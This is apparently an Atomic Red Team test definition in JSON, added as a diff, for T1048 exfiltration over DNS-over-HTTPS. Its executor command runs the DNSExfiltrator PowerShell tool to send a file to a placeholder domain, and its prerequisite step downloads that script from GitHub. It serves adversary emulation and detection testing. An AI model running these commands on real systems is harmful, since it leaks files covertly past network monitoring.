@@ -1,0 +1,61 @@
+{
+    "name": "DNSExfiltration (doh)",
+    "description": "DNSExfiltrator allows for transferring (exfiltrate) a file over a DNS request covert channel. This is basically a data leak testing tool allowing to exfiltrate data over a covert channel. !!! Test will fail without a domain under your control with A record and NS record !!!  See this github page for more details - https://github.com/Arno0x/DNSExfiltrator ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "command": "Import-Module \"#{ps_module}\"\nInvoke-DNSExfiltrator -i \"#{ps_module}\" -d #{domain} -p #{password} -doh #{doh} -t #{time} #{encoding}\n",
+        "name": "powershell",
+        "type": "Command Executor"
+    },
+    "id": "T1048",
+    "tactics": [
+        "Exfiltration"
+    ],
+    "technique": "Exfiltration Over Alternative Protocol",
+    "source": "ART",
+    "uuid": "c943d285-ada3-45ca-b3aa-7cd6500c6a48",
+    "arguments": {
+        "password": {
+            "description": "Password used to encrypt the data to be exfiltrated",
+            "type": "string",
+            "default": "atomic"
+        },
+        "domain": {
+            "description": "The domain name to use for DNS requests",
+            "type": "string",
+            "default": "target.example.com"
+        },
+        "ps_module": {
+            "description": "DNSExfiltrator powershell ps_module",
+            "type": "path",
+            "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\dnsexfil.ps1"
+        },
+        "doh": {
+            "description": "Google or CloudFlare DoH (DNS over HTTP) server",
+            "type": "string",
+            "default": "google"
+        },
+        "time": {
+            "description": "The time in milliseconds to wait between each DNS request",
+            "type": "string",
+            "default": "500"
+        },
+        "encoding": {
+            "description": "Set to '-b32' to use base32 encoding of data. Might be required by some DNS resolvers.",
+            "type": "string",
+            "default": null
+        }
+    },
+    "preconditions": [
+        {
+            "description": "DNSExfiltrator powershell file must exist on disk at specified location (#{ps_module})\n",
+            "prereq_command": "if (Test-Path \"#{ps_module}\") {exit 0} else {exit 1}\n",
+            "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nIWR \"https://raw.githubusercontent.com/Arno0x/DNSExfiltrator/8faa972408b0384416fffd5b4d42a7aa00526ca8/Invoke-DNSExfiltrator.ps1\" -OutFile \"#{ps_module}\"\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
